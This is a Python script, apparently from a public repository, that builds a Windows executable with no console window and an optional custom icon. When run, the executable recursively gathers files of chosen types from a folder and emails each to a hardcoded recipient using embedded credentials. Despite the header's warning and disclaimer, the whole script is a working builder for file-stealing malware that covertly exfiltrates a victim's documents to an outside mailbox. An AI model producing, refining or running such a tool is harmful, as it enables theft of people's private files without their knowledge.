#######################################################################################
# Mail Attachment Tool
# Developed by: ugurcomptech
# License: Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License 

# WARNING: This tool can potentially be misused for malicious purposes and may lead to
# unauthorized access to other people's important data. Use it responsibly and only with
# the consent of the recipient for legitimate purposes.

# Disclaimer: The developer is not responsible for any misuse or damage caused by this tool.
#######################################################################################

import os
import glob
import yagmail
import argparse

if __name__ == "__main__":
    # Create an argparse object to handle the arguments
    parser = argparse.ArgumentParser(description="Send files from your computer via email.", add_help=True)
    parser.add_argument("-s", "--sender-email", required=True, help="The sender's email address.")
    parser.add_argument("-p", "--sender-password", required=True, help="The sender's email password.")
    parser.add_argument("-r", "--receiver-email", required=True, help="The recipient's email address.")
    parser.add_argument("-d", "--folder-path", required=True, help="The path to the folder you want to scan (e.g., C:\\my_folder).")
    parser.add_argument("-f", "--file-extensions", nargs="+", required=True,
                        help="The file extensions you want to scan, separated by spaces (e.g., pdf jpg png)")
    parser.add_argument("-n", "--exe-name", required=True, help="The name of the generated exe file.")
    parser.add_argument("-i", "--icon", help="The path to the icon file for the generated exe.")
    parser.add_argument("--email-subject", required=True, help="The subject of the email.")
    parser.add_argument("--email-body", required=True, help="The body of the email.")

    args = parser.parse_args()

    # Determine the name of the exe file
    exe_name = args.exe_name

    # Create the embedded code to be placed in the exe file
    embedded_code = f"""
import os
import glob
import yagmail
from getpass import getpass

def send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path):
    try:
        # Create the Yagmail client
        yag = yagmail.SMTP(sender_email, sender_password)

        # Send the email
        yag.send(
            to=receiver_email,
            subject=subject,
            contents=body,
            attachments=attachment_path,
        )
        print(f"Email sent successfully to {{attachment_path}}.")
        # Close the Yagmail client
        yag.close()
    except Exception as e:
        print(f"An error occurred: {{e}}")

if __name__ == "__main__":
    # Define the email account information
    sender_email = "{args.sender_email}"
    sender_password = "{args.sender_password}"
    receiver_email = "{args.receiver_email}"

    # Scan files in the specified folder and subfolders
    attachment_files = []
    for extension in {args.file_extensions}:
        attachment_files.extend(glob.glob(os.path.join("{args.folder_path}", f"**/*." + extension), recursive=True))

    # Define the email subject and body
    subject = "{args.email_subject}"
    body = "{args.email_body}"

    # Complete the email sending process
    for attachment_file in attachment_files:
        # Call the function to send the email
        send_email(sender_email, sender_password, receiver_email, subject, body, attachment_file)

    print("Emails sent successfully.")
"""

    # Embed the code into the exe file
    with open(exe_name + ".py", "w", encoding="utf-8") as exe_file:
        exe_file.write(embedded_code)

    # Create the exe file
    pyinstaller_cmd = f"pyinstaller --onefile --noconsole {exe_name}.py"

    # Add the icon argument to the pyinstaller command if provided
    if args.icon:
        pyinstaller_cmd += f" --icon {args.icon}"

    os.system(pyinstaller_cmd)

    # Remove the unnecessary python file that was created
    os.remove(f"{exe_name}.py")

    print(f"'{exe_name}.exe' file is created and code is embedded.")
